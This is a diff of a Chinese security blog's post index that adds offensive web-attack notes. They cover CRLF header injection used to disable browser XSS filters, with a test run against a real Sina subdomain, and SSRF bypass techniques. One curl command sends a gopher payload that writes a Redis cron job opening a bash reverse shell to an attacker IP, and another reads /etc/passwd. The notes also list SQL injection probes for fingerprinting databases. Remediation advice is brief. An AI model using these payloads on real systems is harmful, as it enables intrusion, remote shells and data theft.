@@ -1763,7 +1763,27 @@
 <p>此时服务器端接收到的url参数值是我们修改后的：<br><code>http://baidu.com/xxx%0a%0dSet-Cookie: test123=123</code></p>
 <p>在url参数值拼接到Location字符串中，设置成响应头后，响应头就会看到：<br><code>Set-Cookie: test123=123</code></p>
 <h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式#"></a>修复方式<a href="https://www.cnblogs.com/mysticbinary/p/12560080.html#1237469176" target="_blank" rel="noopener">#</a></h1><p>服务端收到前端过来的参数，在加入Location之前，需要过滤 \r 、\n 之类的行结束符，避免输入的数据污染其它HTTP首部字段。</p>
+<h1 id="绕过服务端的filiter（xss漏洞）"><a href="#绕过服务端的filiter（xss漏洞）" class="headerlink" title="绕过服务端的filiter（xss漏洞）"></a>绕过服务端的filiter（xss漏洞）</h1><p>1，可以在header当中注入另外的字符集<meta charset="ISO-2022-KR"></p>
+<p>使用%0f进行标记，之后的字符就不会过滤。韩语中字符0f之后就截断了。</p>
+<p>2，可以注入一个X-XSS-Protection:0就不会被拦截了</p>
+<p>使用一次%0d%0a就可以注入其http header当中的代码比如注入set-cookie信息造成会话固定漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.sina.com.cn&#x2F;?url&#x3D;%0d%0a%0d%0a&lt;img src&#x3D;1 onerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之前说了浏览器会根据第一个CRLF把HTTP包分成头和体，然后将体显示出来。于是我们这里<img>这个标签就会显示出来，造成一个XSS。</p>
+<p>为什么说是无视浏览器filter的，这里涉及到另一个问题。</p>
+<p>浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。</p>
+<p>怎样才能关掉filter？一般来说用户这边是不行的，只有<strong>数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。</strong></p>
+<p>说到这里应该就很清楚了，HRS不正是注入HTTP头的一个漏洞吗，我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS。</p>
+<p>所以说HRS的危害大于XSS，因为它能绕过一般XSS所绕不过的filter，并能产生会话固定漏洞。</p>
+<p>我们来一个真实案例吧。</p>
+<p>新浪某分站含有一个url跳转漏洞，危害并不大，于是我就想到了CRLF Injection，当我测试</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.sina.com.cn&#x2F;?url&#x3D;%0a%0d%0a%0d%3Cimg%20src&#x3D;1%3E</span><br></pre></td></tr></table></figure>
+
+<p>的时候，发现图片已经输出在页面中了，说明CRLF注入成功了：</p>
+<p>X-XSS-Protection:0和xss植入一起利用</p>
+<p>url=%0aX-Xss-Protection:%200%0a%0d%0a%0d&lt;img%20src=1%20onerror=alert(/xss/)&gt;</p>
 <h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献#"></a>参考文献<a href="https://www.cnblogs.com/mysticbinary/p/12560080.html#2983859797" target="_blank" rel="noopener">#</a></h1><p><a href="https://www.jianshu.com/p/2f2e311e797b" target="_blank" rel="noopener">https://www.jianshu.com/p/2f2e311e797b</a><br><a href="https://blog.csdn.net/shakeyin1998/article/details/88411756" target="_blank" rel="noopener">https://blog.csdn.net/shakeyin1998/article/details/88411756</a></p>
+<p><a href="https://www.cnblogs.com/studyskill/p/6972576.html（good）" target="_blank" rel="noopener">https://www.cnblogs.com/studyskill/p/6972576.html（good）</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -2992,14 +3012,65 @@
   <entry>
     <title>ssrf挖掘技巧/ssrf挖掘技巧</title>
     <url>/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    很久没更新呢是因为结石了，恢复了很久。一定要多运动多跳！写这个呢也是因为ssrf可利用的面挺广的，所以要先找出点再后渗透，也附带修复建议。</p>
-<h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><h2 id="0x03-可能存在的坑"><a href="#0x03-可能存在的坑" class="headerlink" title="0x03 可能存在的坑"></a>0x03 可能存在的坑</h2><ul>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    很久没更新呢是因为结石了，恢复了很久。一定要多运动多跳！写这个呢也是因为ssrf可利用的面挺广的，所以要先找出点再后渗透，也附带修复建议。一般发起网络请求中会使用libcurl库。</p>
+<h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+<p>SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
+<p>1：可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;<br>2：攻击运行在内网或本地的应用程序（比如溢出）;<br>3：对内网web应用进行指纹识别，通过访问默认文件实现;<br>4：攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）（毕竟外网访问不到或者受限制，只能伪造服务器的请求）;<br>5：利用file协议读取本地文件等。</p>
+<h2 id="0x03-可能存在的坑"><a href="#0x03-可能存在的坑" class="headerlink" title="0x03 可能存在的坑"></a>0x03 可能存在的坑</h2><ul>
 <li>测试支持的协议:http、https、gopher、telnet 等协议。</li>
 <li>SSRF 的类型为无状态型 SSRF ，即不管你请求的端口是否开放、协议是否支持、网站是否能访问 返回的状态都是一样的，你无法通过它扫描端口开放情况和使用 file 协议读取本地信息。</li>
 <li>不支持 302 跳转</li>
 </ul>
-<h2 id="0x04-技巧"><a href="#0x04-技巧" class="headerlink" title="0x04 技巧"></a>0x04 技巧</h2><p>1、后缀名检测</p>
+<h2 id="0x04-挖掘-技巧"><a href="#0x04-挖掘-技巧" class="headerlink" title="0x04 挖掘+技巧"></a>0x04 挖掘+技巧</h2><h3 id="挖掘漏洞："><a href="#挖掘漏洞：" class="headerlink" title="挖掘漏洞："></a>挖掘漏洞：</h3><p>对外发起网络请求的地方都可能存在SSRF漏洞，列举<br>图片加载下载，分享页面，在线翻译，未公开的api（从远程服务器请求资源<br>文件处理，编码处理, 属性信息处理。</p>
+<h3 id="挖掘方式："><a href="#挖掘方式：" class="headerlink" title="挖掘方式："></a>挖掘方式：</h3><p>分为两大类：1、web功能点 2、数据包传参</p>
+<p><img src="/2020/12/22/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/ssrf%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7/1.jpg" alt></p>
+<p><strong>利用＋绕过</strong></p>
+<p>1、后缀名检测</p>
 <p>输入<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>却发现并没有回显请求，这是因为这种地方一般会对<strong>后缀</strong>做一个检测，如果不是jpg或者其他图片后缀的话并不会通过，不过好在<a href="https://link.zhihu.com/?target=http%3A//ceye.io">http://ceye.io</a>是很强大的，我们可以随便构造，<a href="https://link.zhihu.com/?target=http%3A//abcdef.ceye.io/ichunqiu.jpg">http://abcdef.ceye.io/ichunqiu.jpg</a>, 对其进行输入，再去观察有无回显。</p>
+<p><strong>绕过</strong></p>
+<ul>
+<li>@</li>
+<li>添加端口号</li>
+<li>短网址绕过</li>
+<li>指向任意ip的域名绕过 xip.io</li>
+<li>p限制绕过的话就利用进制转换（十进制、八进制、十六进制这些）</li>
+<li>协议绕过（只支持http(s)的话可以构造302跳转再转换协议、后面有提到。）</li>
+<li><strong>DNS rebinding</strong></li>
+</ul>
+<p>dns重绑定可以利用与ssrf绕过、bypass同源策略等</p>
+<p>1、 特定域名ttl=0</p>
+<p>2、绑定两条A记录，一条内网、一条为外网，第一次解析成外网，第二次解析到内网就可以成功。（但是dns有缓存机制？）</p>
+<p>3、自建dns服务器</p>
+<h2 id="0x05-找到ssrf漏洞之后"><a href="#0x05-找到ssrf漏洞之后" class="headerlink" title="0x05 找到ssrf漏洞之后"></a>0x05 找到ssrf漏洞之后</h2><h3 id="1、-PHP"><a href="#1、-PHP" class="headerlink" title="1、 PHP"></a>1、 PHP</h3><p>​    找到ssrf漏洞之后，应该去检查这几件事，试试从低位拉到高位</p>
+<ol>
+<li><p>摸清SSRF的状态是否为布尔状态（看返回包返回的信息，也有可能无回显盲注去打打）<strong>题外：url跳转测试以下CRLF漏洞Set-Cookie以下</strong></p>
+</li>
+<li><p>此SSRF支持什么协议（gopher、http、telnet、dict）（1、4扫描redis写webshell）</p>
+</li>
+<li><p>此SSRF是否支持302跳转（如果限制ip端口这些类型访问啥的，如果支持跳转可利用的面更广一点）（<strong>外连端口用nc确定ip地址</strong>）</p>
+<p>​    </p>
+<p>​    当URL存在临时(302)或永久(301)跳转时，则<strong>继续请求跳转后的URL</strong><br>​    那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。我们继续构造一个302跳转服务，代码如下302.php:</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用：</span><br><span class="line"># 利用dict探测端口</span><br><span class="line">dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info  </span><br><span class="line">curl -vvv &#39;http:&#x2F;&#x2F;sec.com:8082&#x2F;ssrf2.php?url&#x3D;http:&#x2F;&#x2F;myip&#x2F;ssrf&#x2F;302.php?s&#x3D;dict&amp;i&#x3D;127.0.0.1&amp;port&#x3D;6379&amp;data&#x3D;info&#39;</span><br><span class="line"></span><br><span class="line"># 任意文件读取</span><br><span class="line">curl -vvv &#39;http:&#x2F;&#x2F;sec.com:8082&#x2F;ssrf2.php?url&#x3D;http:&#x2F;&#x2F;myip&#x2F;ssrf&#x2F;302.php?s&#x3D;file&amp;data&#x3D;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">还在尝试，究竟是file还是需要再构造一个跳转</span><br><span class="line"></span><br><span class="line">#利用gopher协议反弹shell</span><br><span class="line">curl -vvv &#39;http:&#x2F;&#x2F;sec.com:8082&#x2F;ssrf_only_http_s.php?url&#x3D;http:&#x2F;&#x2F;sec.com:8082&#x2F;302.php?s&#x3D;gopher&amp;i&#x3D;127.0.0.1&amp;p&#x3D;6389&amp;query&#x3D;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </span><br><span class="line">a%0a%0a*&#x2F;1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20&#x2F;dev&#x2F;tcp&#x2F;（evil_ip）&#x2F;6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </span><br><span class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</span><br><span class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39;</span><br><span class="line"></span><br><span class="line"># nc</span><br><span class="line">&#x2F;302.php?s&#x3D;dict&amp;ip&#x3D;myip&amp;port&#x3D;14433&amp;data&#x3D;helo:dict</span><br><span class="line">nc -lvp 814433</span><br><span class="line"></span><br><span class="line">Connection from 113.108.10.16 port 14433 [tcp&#x2F;webcache] accepted</span><br><span class="line">GET &#x2F;gopher HTTP&#x2F;1.1</span><br><span class="line">Host: 106.75.199.107:8080</span><br><span class="line">Accept: *&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>再罗列一下curl支持的协议</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DICT</span><br><span class="line">FILE</span><br><span class="line">FTP</span><br><span class="line">FTPS</span><br><span class="line">GOPHER</span><br><span class="line">HTTP</span><br><span class="line">HTTPS</span><br><span class="line">IMAP</span><br><span class="line">IMAPS</span><br><span class="line">LDAP</span><br><span class="line">LDAPS</span><br><span class="line">POP3</span><br><span class="line">POP3S</span><br><span class="line">RTSP</span><br><span class="line">SMB</span><br><span class="line">SMBS</span><br><span class="line">SMTP</span><br><span class="line">SMTPS</span><br><span class="line">TELNET</span><br><span class="line">TFTP</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一、尝试请求一个没开放的1234端口回显“链接不可用”</p>
+<p>二、尝试请求开放的22端口回显“链接不可用” </p>
+<p>三、尝试请求开放的80端口回显“success”并把图片抓了回来（支持http协议）</p>
+<p>四、尝试请求自己搭建的302跳转回显“链接不可用”但是跳转成功。</p>
+<p><strong>得出结论：</strong></p>
+<p><strong>此SSRF为布尔型SSRF，能探测http应用并获取html源码、支持302跳转，可尝试通过响应速度来探测端口但误报率很高（某些端口可能是一直连接，最后超时）</strong></p>
+<h3 id="2、-Java"><a href="#2、-Java" class="headerlink" title="2、 Java"></a>2、 Java</h3><p><strong>1.     利用方式</strong><br>网络请求支持的协议如下<br>http，https，file，ftp，mailto，jar，netdoc<br>对比php的ssrf，java这块利用相对局限，</p>
+<p><strong>2.     总结</strong><br>以下几种类引用不当会造成SSRF<br>Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类，<br>修复方案：<br>•     限制协议为HTTP、HTTPS<br>•     不用限制302重定向<br>•     设置URL白名单或者限制内网IP</p>
+<p><a href="https://paper.seebug.org/510/（这篇介绍如何攻击关系型数据库mysql、postgreSql、Mssql）" target="_blank" rel="noopener">https://paper.seebug.org/510/（这篇介绍如何攻击关系型数据库mysql、postgreSql、Mssql）</a></p>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12973650.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12973650.html</a></p>
+<p><a href="http://www.codersec.net/2020/05/SSRF%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">http://www.codersec.net/2020/05/SSRF%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-41070.html</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -3137,9 +3208,32 @@
 
 <h3 id="3、-数据库类型探测"><a href="#3、-数据库类型探测" class="headerlink" title="3、 数据库类型探测"></a>3、 数据库类型探测</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WAITFOR DELAY &#39;0:0:4&#39;   &#x2F;&#x2F;mssql 延时四秒</span><br></pre></td></tr></table></figure>
 
+<p><a href="https://www.bugfor.com/web/5167.html" target="_blank" rel="noopener">https://www.bugfor.com/web/5167.html</a></p>
+<p>Orancle:</p>
+<p><strong>1. 通过报错信息判断</strong></p>
+<blockquote>
+<p>ORA-01756:quoted string not properly terminated</p>
+<p>ORA-00933:SQLcommand not properly ended</p>
+</blockquote>
+<p><strong>2. 通过连接符判断</strong></p>
+<blockquote>
+<p>‘1’||’1’=’11’</p>
+<p>concat(‘1′,’1′)=’11’</p>
+</blockquote>
+<p><strong>3. 通过特有数据表判断</strong></p>
+<blockquote>
+<p>and (select count(*) from sys.user_tables)&gt;0</p>
+</blockquote>
+<p><strong>4. 通过length函数判断</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以使用length,不能使用len.  len(&#39;a&#39;)&#x3D;1  （报错）</span><br></pre></td></tr></table></figure>
+
+<p><strong>5. 通过substr函数判断</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只能使用substr,不能用substring。</span><br></pre></td></tr></table></figure>
 
 
 
+<p>总的判断原则：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、各个数据库特有的数据表来判断：</span><br><span class="line"></span><br><span class="line">    1、mssql数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    2、access数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from msysobjects)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    3、mysql数据库(mysql版本在5.0以上)</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from information_schema.TABLES)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">    4、oracle数据库</span><br><span class="line"></span><br><span class="line">      http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and (select count(*) from sys.user_tables)&gt;0 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">二、通过各数据库特有的连接符判断数据库类型：</span><br><span class="line"></span><br><span class="line">    1、mssql数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39; + &#39;1&#39; &#x3D; &#39;11&#39;</span><br><span class="line"></span><br><span class="line">    2、mysql数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39; + &#39;1&#39; &#x3D; &#39;11&#39;</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;1&#39;,&#39;1&#39;)&#x3D;&#39;11&#39;</span><br><span class="line"></span><br><span class="line">    3、oracle数据库</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and &#39;1&#39;||&#39;1&#39;&#x3D;&#39;11&#39;</span><br><span class="line"></span><br><span class="line">     http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 and CONCAT(&#39;1&#39;,&#39;1&#39;)&#x3D;&#39;11&#39;</span><br><span class="line">三、 有回显信息的话报错看更好</span><br></pre></td></tr></table></figure>
 
 
 
